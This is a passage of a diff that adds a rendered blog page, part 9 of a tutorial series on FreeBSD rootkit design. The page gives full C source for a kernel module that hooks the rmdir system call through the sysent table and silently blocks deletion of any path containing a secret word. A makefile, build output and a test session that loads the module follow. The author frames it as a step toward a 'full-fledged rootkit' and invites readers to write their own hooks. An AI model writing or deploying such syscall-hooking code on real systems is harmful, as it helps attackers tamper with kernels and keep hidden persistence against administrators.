+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/sysproto.h&gt;
+</span>
+<span class="cm">/* The system call's arguments. */</span>
+<span class="cm">/* Refer to /usr/src/bin/rmdir */</span>
+<span class="k">struct</span> <span class="n">rmdir_hook_args</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="cm">/* rmdir system call hook */</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">rmdir_hook</span><span class="p">(</span><span class="k">struct</span> <span class="kr">thread</span> <span class="o">*</span><span class="n">td</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">syscall_args</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">rmdir_hook_args</span> <span class="o">*</span><span class="n">uap</span><span class="p">;</span>
+    <span class="n">uap</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">rmdir_hook_args</span> <span class="o">*</span><span class="p">)</span><span class="n">syscall_args</span><span class="p">;</span>
+
+    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">255</span><span class="p">];</span>
+    <span class="kt">size_t</span> <span class="n">done</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">error</span><span class="p">;</span>
+
+    <span class="n">error</span> <span class="o">=</span> <span class="n">copyinstr</span><span class="p">(</span><span class="n">uap</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">done</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">error</span><span class="p">);</span>
+
+    <span class="cm">/* print a debug message */</span>
+    <span class="n">uprintf</span><span class="p">(</span><span class="s">"The directory "</span><span class="o">%</span><span class="n">s</span><span class="s">" will be removed!n"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+
+    <span class="cm">/* Check if the secret dir is to be removed */</span>
+    <span class="kt">char</span> <span class="n">secret</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"hailang"</span><span class="p">;</span>
+
+    <span class="cm">/*
+        If path is a directory name.
+        Plain name without '/'
+    */</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="n">secret</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">uprintf</span><span class="p">(</span><span class="s">"[Deleting folder]... FAILEDn"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//Exit
+</span>    <span class="p">}</span>
+    <span class="cm">/*
+        If path is a path
+
+        Including absolute path like /usr/local/etc/[secret]
+        and ./../tmp/test/[secret]
+
+        The deletion will be denied as long as the path contains [secret]
+        e.g. /usr/local/etc/[secret]/test1/test2 will be denied.
+    */</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">pch</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">path_ptr</span> <span class="o">=</span> <span class="n">path</span><span class="p">;</span>
+
+        <span class="cm">/* char *strsep(char **stringp, const char *delim); */</span>
+        <span class="k">while</span><span class="p">((</span><span class="n">pch</span> <span class="o">=</span> <span class="n">strsep</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">path_ptr</span><span class="p">,</span><span class="s">"/"</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pch</span><span class="p">,</span><span class="n">secret</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="n">uprintf</span><span class="p">(</span><span class="s">"[Deleting folder]... FAILEDn"</span><span class="p">);</span>
+                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//Exit
+</span>                <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kt">int</span> <span class="n">errors</span> <span class="o">=</span> <span class="n">rmdir</span><span class="p">(</span><span class="n">td</span><span class="p">,</span> <span class="n">syscall_args</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">errors</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* The sysent for the new system call */</span>
+<span class="k">static</span> <span class="k">struct</span> <span class="n">sysent</span> <span class="n">rmdir_hook_sysent</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mi">1</span><span class="p">,</span>          <span class="cm">/* number of arguments */</span>
+    <span class="n">rmdir_hook</span>  <span class="cm">/* implementing function */</span>
+<span class="p">};</span>
+
+<span class="cm">/* The offset in sysent[] where the system call is to be allocated. */</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">NO_SYSCALL</span><span class="p">;</span>
+
+<span class="cm">/* The function called at load/unload. */</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">load</span><span class="p">(</span><span class="k">struct</span> <span class="n">module</span> <span class="o">*</span><span class="n">module</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">error</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="n">MOD_LOAD</span><span class="p">:</span>
+            <span class="cm">/* Replace mkdir with mkdir_hook. */</span>
+            <span class="n">sysent</span><span class="p">[</span><span class="n">SYS_rmdir</span><span class="p">].</span><span class="n">sy_call</span> <span class="o">=</span> <span class="p">(</span><span class="n">sy_call_t</span> <span class="o">*</span><span class="p">)</span><span class="n">rmdir_hook</span><span class="p">;</span>
+            <span class="n">uprintf</span><span class="p">(</span><span class="s">"The rmdir_hook is loaded, you can try to rmdir now.n"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="n">MOD_UNLOAD</span><span class="p">:</span>
+            <span class="cm">/* Change everything back to normal. */</span>
+            <span class="n">sysent</span><span class="p">[</span><span class="n">SYS_rmdir</span><span class="p">].</span><span class="n">sy_call</span> <span class="o">=</span> <span class="p">(</span><span class="n">sy_call_t</span> <span class="o">*</span><span class="p">)</span><span class="n">rmdir</span><span class="p">;</span>
+            <span class="n">uprintf</span><span class="p">(</span><span class="s">"The rmdir_hook is unloaded, everything is back to normal now.n"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="nl">default:</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">EOPNOTSUPP</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span><span class="p">(</span><span class="n">error</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">SYSCALL_MODULE</span><span class="p">(</span><span class="n">rmdir_hook</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rmdir_hook_sysent</span><span class="p">,</span> <span class="n">load</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>What I did was basically copy the <strong><em>mkdir_hook</em></strong> sample from last note and changed
+some minor things such as function names and etc. What really matters is the
+logic in the implementing function which we firstly copy the path specified by
+the user from userland to kernel space and then check against a pre-defined
+<strong><em>secret</em></strong>.</p>
+
+<p>What we are trying to achieve is to prevent any path that has the secret word
+inside from being deleted by the user. What we need to do is to check the path
+and see whether the secret word is inside or not. Here comes another problem
+that we need to think about just for a few minutes.</p>
+
+<h3 id="the-absolute-path-and-relative-path">The Absolute Path and Relative Path</h3>
+
+<p>We all know the difference between <strong><em>absolute path</em></strong> and <strong><em>relative path</em></strong>.
+The troublesome part here is that rmdir accepts both of them, meaning that all
+following commands are acceptable.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rmdir /usr/local/etc/test_conf
+rmdir ./../local/etc/test_conf
+rmdir <span class="nb">local</span>/etc/../../local/etc/test_conf
+</code></pre></div></div>
+
+<p>We need to protect our folders from being deleted by using relative path, that’s
+why another checking was implemented in the sample code above to trim ‘/’ from
+path to see is there any part in the path that matches the secret.</p>
+
+<p>What the code does after that is simple enough, it triggers original rmdir call
+if secret was not present in the path and the return the status of the execution
+so that users will be able to see original error messages as well.</p>
+
+<p>Of course, in a real life rootkit, you probably don’t want to print out debug
+messages saying the deletion failed, they are just for the purpose of this
+demonstration.</p>
+
+<p>Save the following makefile in the same directory and compile the code.</p>
+
+<div class="language-makefile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">FILE</span><span class="o">:</span> <span class="nf">makefile</span>
+<span class="nv">KMOD</span><span class="o">=</span>   rmdir_hook
+<span class="nv">SRCS</span><span class="o">=</span>   rmdir_hook.c
+
+<span class="err">.include</span> <span class="err">&lt;bsd.kmod.mk&gt;</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZFSTest# make
+Warning: Object directory not changed from original /zroot/development/4.Hooks/extra
+cc <span class="nt">-O2</span> <span class="nt">-pipe</span> <span class="nt">-fno-strict-aliasing</span> <span class="nt">-Werror</span> <span class="nt">-D_KERNEL</span> <span class="nt">-DKLD_MODULE</span> <span class="nt">-nostdinc</span>   <span class="nt">-I</span><span class="nb">.</span> <span class="nt">-I</span>@ <span class="nt">-I</span>@/contrib/altq <span class="nt">-finline-limit</span><span class="o">=</span>8000 <span class="nt">--param</span> inline-unit-growth<span class="o">=</span>100 <span class="nt">--param</span> large-function-growth<span class="o">=</span>1000 <span class="nt">-fno-common</span>  <span class="nt">-fno-omit-frame-pointer</span>  <span class="nt">-mcmodel</span><span class="o">=</span>kernel <span class="nt">-mno-red-zone</span>  <span class="nt">-mfpmath</span><span class="o">=</span>387 <span class="nt">-mno-sse</span> <span class="nt">-mno-sse2</span> <span class="nt">-mno-sse3</span> <span class="nt">-mno-mmx</span> <span class="nt">-mno-3dnow</span>  <span class="nt">-msoft-float</span> <span class="nt">-fno-asynchronous-unwind-tables</span> <span class="nt">-ffreestanding</span> <span class="nt">-fstack-protector</span> <span class="nt">-std</span><span class="o">=</span>iso9899:1999 <span class="nt">-fstack-protector</span> <span class="nt">-Wall</span> <span class="nt">-Wredundant-decls</span> <span class="nt">-Wnested-externs</span> <span class="nt">-Wstrict-prototypes</span>  <span class="nt">-Wmissing-prototypes</span> <span class="nt">-Wpointer-arith</span> <span class="nt">-Winline</span> <span class="nt">-Wcast-qual</span>  <span class="nt">-Wundef</span> <span class="nt">-Wno-pointer-sign</span> <span class="nt">-fformat-extensions</span> <span class="nt">-c</span> rmdir_hook.c
+ld  <span class="nt">-d</span> <span class="nt">-warn-common</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="nt">-o</span> rmdir_hook.ko rmdir_hook.o
+:&gt; export_syms
+awk <span class="nt">-f</span> /sys/conf/kmod_syms.awk rmdir_hook.ko  export_syms | xargs <span class="nt">-J</span>% objcopy % rmdir_hook.ko
+objcopy <span class="nt">--strip-debug</span> rmdir_hook.ko
+ZFSTest#
+</code></pre></div></div>
+
+<h3 id="testing-the-invincibility">Testing The Invincibility</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZFSTest# mkdir <span class="nt">-p</span> /tmp/1/hailang/2
+ZFSTest# mkdir /tmp/1/hailang/3
+ZFSTest# kldload ./rmdir_hook.ko
+The rmdir_hook is loaded, you can try to rmdir now.
+ZFSTest# rmdir /tmp/1/hailang/
+The directory <span class="s2">"/tmp/1/hailang/"</span> will be removed!
+<span class="o">[</span>Deleting folder]... FAILED
+ZFSTest# rmdir /tmp/1/hailang/<span class="k">*</span>
+The directory <span class="s2">"/tmp/1/hailang/2"</span> will be removed!
+<span class="o">[</span>Deleting folder]... FAILED
+The directory <span class="s2">"/tmp/1/hailang/3"</span> will be removed!
+<span class="o">[</span>Deleting folder]... FAILED
+ZFSTest# rm <span class="nt">-rf</span> /tmp/1/hailang/<span class="k">*</span>
+The directory <span class="s2">"/tmp/1/hailang/2"</span> will be removed!
+<span class="o">[</span>Deleting folder]... FAILED
+The directory <span class="s2">"/tmp/1/hailang/3"</span> will be removed!
+<span class="o">[</span>Deleting folder]... FAILED
+ZFSTest# <span class="nb">cd</span> /tmp/1
+ZFSTest# rmdir ./../1/hailang/2/
+The directory <span class="s2">"./../1/hailang/2/"</span> will be removed!
+<span class="o">[</span>Deleting folder]... FAILED
+ZFSTest#
+</code></pre></div></div>
+
+<p>Looks like it’s working as intended, but much more are needed for it to become a
+full-fledged rootkit.</p>
+
+<p>Play with the sample code, trace your kernel, write your own descipable hooks
+and share them if you want. I think I have demonstrated what powerful and fun
+things we can potentially achieve with kernel hooking. Have fun!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C++</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#freebsd" class="page__taxonomy-item" rel="tag">FreeBSD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rootkit" class="page__taxonomy-item" rel="tag">Rootkit</a>
+    
+    </span>
+  </p>
+
+
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2011-07-24T00:00:00+08:00">July 24, 2011</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=FreeBSD+Rootkit+Design+Howtos+-+9+-+Hook+Kernel+Process+Tracking+and+rmdir_hook+Example%20http%3A%2F%2Flocalhost%3A4000%2Ffreebsd-rootkit-design-howtos-9-hook-kernel-process-tracking-and-rmdir-hook-example%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ffreebsd-rootkit-design-howtos-9-hook-kernel-process-tracking-and-rmdir-hook-example%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Ffreebsd-rootkit-design-howtos-9-hook-kernel-process-tracking-and-rmdir-hook-example%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/the-2-eggs-vs-100-floor-problem/" class="pagination--pager" title="2 Eggs versus 100 Floor
+">Previous</a>
+    
+    
+      <a href="/multiples-of-3-and-5/" class="pagination--pager" title="Multiples of 3 And 5
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/what-is-wrong-with-microservice/" rel="permalink">What is wrong with microservice
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  less than 1 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Welcome
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/largest-product-in-a-series/" rel="permalink">Largest Product In A Series
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  1 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  Find the greatest product of five consecutive digits in the 1000-digit number.
+
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/10001st-prime-number/" rel="permalink">10001st Prime Number
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  2 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see
+that the 6th prime is 13. What is the 10001st prime number?
+
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/freebsd-mmap-ptrace-privilege-escalation-exploit-analysis/" rel="permalink">FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  5 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  Happy Birthday FreeBSD! Now you are 20 years old and your security is the same
+as 20 years ago… :) – Hunger hunger@hunger.hu
+
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2019 Hai Lang. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
